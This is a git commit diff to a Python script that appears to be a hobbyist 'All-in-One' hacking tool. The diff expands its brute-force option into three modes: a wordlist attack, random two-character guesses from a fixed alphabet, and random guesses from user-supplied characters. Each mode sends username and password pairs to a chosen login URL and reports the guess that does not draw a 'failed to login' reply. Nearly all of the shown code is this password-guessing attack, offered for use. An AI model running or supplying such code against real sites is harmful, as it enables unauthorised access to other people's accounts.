f60b3c7adf34fabcf8fe68127b9c0c77f3c537dc
MrElvo <yuval9512@gmail.com>
2022-05-28 18:08:21 +0300

    Update Test Evn.py

--- Test Evn.py
+++ Test Evn.py
@@ -3,11 +3,11 @@ class AllinOne:
 
         print("Welcome to All-in-One-Elvo Tool")
         print('''
-    Choose Your Option From The List Below :)
+Choose Your Option From The List Below :)
     
-        1.For Brute-Force enter Brute Force
-        2.For AES encryption enter AES
-        ''')
+    1.For Brute-Force enter Brute Force
+    2.For AES encryption enter AES
+ ''')
         User_Choice = input("And your choice would be?\n...: ").upper()
         print("You chose...: " , User_Choice.capitalize())
 
@@ -23,43 +23,125 @@ class AllinOne:
         # -----------------------Brute Force-----------------------
         if User_Choice == 'BRUTE FORCE':
             import requests
+            import random
 
-            url = input('Place the URL: ')
-            username = input('Place the username: ')
-            # chars =  "123"
+            BruteIntro = print('''How would you like to Brute Force?
 
-            def send_request(username, passwd):
-                data = {
-                    "username": username,
-                    "password": passwd
-                }
+    1.With a Worldlist [1]
+    2.With Random Numbers[2]
+    3.With Your Own Characters[3]
+''')
+            BruteChoice = input(str("And your choice would be?\n...: "))
+            print("You chose...: ", BruteChoice)
 
-                r = requests.get(url, data=data)
-                return r
+            if BruteChoice == "1":
+                import requests
 
+                url = input('Place the URL: ')
+                username = input('Place the username: ')
 
-            def implist():
-                worldlist = input('Wordlist Path...: ')
-                print('ADD .txt TO THE FILE!')
-                file = open(worldlist , 'r')
-                tries = file.read().split('\n')
-                file.close()
-                return tries
+                # chars =  "123"
 
+                def send_request(username, passwd):
+                    data = {
+                        "username": username,
+                        "password": passwd
+                    }
 
-            def main(tries):
-                for passwd in tries:
-                    r = send_request(username, passwd)
+                    r = requests.get(url, data=data)
+                    return r
 
-                    if 'failed to login' in r.text.lower():
-                        print(f"Incorrect {passwd}\n")
-                    else:
-                        print(f"Correct Password | {passwd} | !\n")
-                        break
+                def implist():
+                    print('ADD .txt TO THE FILE!')
+                    worldlist = input('Wordlist Path...: ')
+                    file = open(worldlist, 'r')
+                    tries = file.read().split('\n')
+                    file.close()
+                    return tries
 
+                def main(tries):
+                    for passwd in tries:
+                        r = send_request(username, passwd)
 
-            tries = implist()
-            main(tries)
+                        if 'failed to login' in r.text.lower():
+                            print(f"Incorrect {passwd}\n")
+                        else:
+                            print(f"Correct Password | {passwd} | !\n")
+                            break
+
+                tries = implist()
+                main(tries)
+
+            elif BruteChoice == "2":
+
+                import requests
+                import random
+
+                url = input('Place the URL: ')
+                username = input('Place the username: ')
+                chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+                def send_request(username, passwd):
+                    data = {
+                        "username": username,
+                        "password": passwd
+                    }
+
+                    r = requests.get(url, data=data)
+                    return r
+
+                def main():
+                    while True:
+                        rndpasswd = random.choices(chars, k=2)
+                        # k= is the password length.
+                        passwd = "".join(rndpasswd)
+                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
+                        r = send_request(username, passwd)
+
+                        if 'failed to login' in r.text.lower():
+                            print(f"Incorrect {passwd}\n")
+                        else:
+                            print(f"Correct Password | {passwd} | !\n")
+                            break
+
+                main()
+
+            elif BruteChoice == "3":
+                import requests
+                import random
+
+                url = input('Place the URL: ')
+                username = input('Place the username: ')
+                chars = input('Write the characters to use')
+
+                def send_request(username, passwd):
+                    data = {
+                        "username": username,
+                        "password": passwd
+                    }
+
+                    r = requests.get(url, data=data)
+                    return r
+
+                def main():
+                    while True:
+                        rndpasswd = random.choices(chars, k=2)
+                        # k= is the password length.
+                        passwd = "".join(rndpasswd)
+                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
+                        r = send_request(username, passwd)
+
+                        if 'failed to login' in r.text.lower():
+                            print(f"Incorrect {passwd}\n")
+                        else:
+                            print(f"Correct Password | {passwd} | !\n")
+                            break
+
+                main()
+
+            else:
+                print("That's not one of the options... start again\n")
+                return object.HackTools('Elvo.a', 'Elvo.b', 'Elvo.c', '')
         # -----------------------Brute Force-----------------------
 
 
